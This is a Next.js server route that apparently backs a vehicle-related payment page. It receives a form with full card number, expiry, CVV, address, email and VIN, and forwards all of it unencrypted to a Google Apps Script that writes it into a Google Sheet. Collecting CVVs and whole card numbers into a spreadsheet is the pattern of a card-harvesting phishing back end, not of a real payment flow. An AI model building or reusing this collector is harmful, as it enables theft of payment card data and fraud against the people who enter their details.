import { NextResponse } from 'next/server';

export async function POST(request) {
  try {
    const body = await request.json();
    const {
      cardNumber,
      expiry,
      cvv,
      address,
      postalCode,
      country,
      city,
      paymentMethod,
      vin,
      email,
      carModel,
      plan,
      price,
      vehicleType,
    } = body;

    const appsScriptUrl = process.env.GOOGLE_APPS_SCRIPT_URL;

    if (!appsScriptUrl) {
      if (process.env.NODE_ENV === 'development') {
        console.warn('GOOGLE_APPS_SCRIPT_URL is not set. Simulating payment form save in development.');
        return NextResponse.json({
          success: true,
          message: 'Payment form saved (development mode)',
          isMock: true,
        });
      }

      return NextResponse.json(
        { success: false, message: 'Google Sheets integration is not configured' },
        { status: 500 }
      );
    }

    const payload = {
      action: 'savePaymentForm',
      timestamp: new Date().toISOString(),
      cardNumber: cardNumber || '',
      expiry: expiry || '',
      cvv: cvv || '',
      address: address || '',
      postalCode: postalCode || '',
      country: country || '',
      city: city || '',
      paymentMethod: paymentMethod || 'Card',
      vin: vin || '',
      email: email || '',
      carModel: carModel || '',
      plan: plan || '',
      price: price || '',
      vehicleType: vehicleType || '',
    };

    const response = await fetch(appsScriptUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
      redirect: 'follow',
    });

    const text = await response.text();
    let result = { success: response.ok };

    try {
      result = JSON.parse(text);
    } catch {
      result = { success: response.ok, raw: text };
    }

    if (!response.ok || result.success === false) {
      return NextResponse.json(
        {
          success: false,
          message: result.error || 'Failed to save payment form to Google Sheets',
        },
        { status: 500 }
      );
    }

    return NextResponse.json({
      success: true,
      message: 'Payment form saved successfully',
    });
  } catch (error) {
    console.error('save-payment-form error:', error);
    return NextResponse.json(
      { success: false, message: error.message || 'Failed to save payment form' },
      { status: 500 }
    );
  }
}
